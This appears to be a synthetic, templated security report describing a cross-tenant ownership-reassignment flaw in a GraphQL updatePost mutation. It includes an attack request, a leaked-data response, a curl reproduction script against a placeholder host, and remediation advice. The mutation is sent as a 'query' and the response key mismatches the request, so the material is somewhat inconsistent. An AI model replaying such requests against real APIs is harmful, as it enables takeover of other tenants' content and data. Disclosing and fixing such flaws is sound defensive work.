# Security Analysis Report
**System:** Horizon Social Graph API
**Domain:** Social Media / Content Platform
**Example ID:** GQL-0261
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.1 | GraphQL single-endpoint vulnerability — `updatePost` mutation accepts cross-tenant `ownerId` reassignment |

---

## Finding 1 — GraphQL Single-Endpoint: Cross-Tenant Ownership Reassignment via Mutation (Pattern 9.1)

### Summary
The `updatePost` GraphQL mutation on Horizon Social Graph API (`api.horizon-social-graph.example.com`) accepts caller-supplied `ownerId` and `status` fields in the input without server-side ownership validation. Per §5.0 Pattern 9.1, the single GraphQL endpoint's mutation resolver applies all input fields without checking whether the caller owns post `P-2261` or whether `ownerId` is a protected field. An attacker from `tenant-4265` can reassign ownership of `tenant-26d4`'s post to `attacker-426526d4` and set its `status` to `approved`. The `getPost` resolver also lacks tenancy checks (§4.0 RISK-GQL-261).

**HAR artifact note:** Request uses `updatePost` mutation but response key is `getPost`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 9.1 — GraphQL: single endpoint vulnerabilities (Platform)
**Affected resolver:** `updatePost(id: ID!, input: PostInput!)`
**Affected endpoint:** `POST https://api.horizon-social-graph.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.horizon-social-graph.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-4265
Content-Type: application/json

{"query": "query VulnerableOp { updatePost(id: \"P-2261\", input: {status: \"approved\", ownerId: \"attacker-426526d4\"}) { postId status } }"}
```

**Response — Mutation Accepted, Victim Post Data Returned**
```json
{
  "data": {
    "getPost": {
      "tenantId": "tenant-26d4",
      "ownerId": "other-user-426526d4",
      "data": { "sensitiveField": "CONFIDENTIAL-426526d4", "internalNotes": "Internal data exposed" }
    }
  }
}
```
Note: `x-request-id: req-426526d4` is a server-assigned **response** header. Not part of the attack request.

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.horizon-social-graph.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" -H "x-tenant-id: tenant-4265" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updatePost(id: \"P-2261\", input: {status: \"approved\", ownerId: \"attacker-426526d4\"}) { postId status } }"}'
# Vulnerable: Mutation accepted, returns CONFIDENTIAL-426526d4 from tenant-26d4
# Secure: Returns FORBIDDEN — post P-2261 does not belong to caller's tenant
```

### Remediation
1. **Pre-mutation ownership check:** Fetch `P-2261`, assert `record.tenantId === $jwt.tenantId` before applying mutation.
2. **Field allowlist:** Strip `ownerId` and `status` from `PostInput` for unprivileged callers.
3. **`getPost` resolver:** `WHERE post_id = $id AND tenant_id = $jwtTenantId`.
4. **Social media note:** Content ownership reassignment enables impersonation and platform integrity attacks.
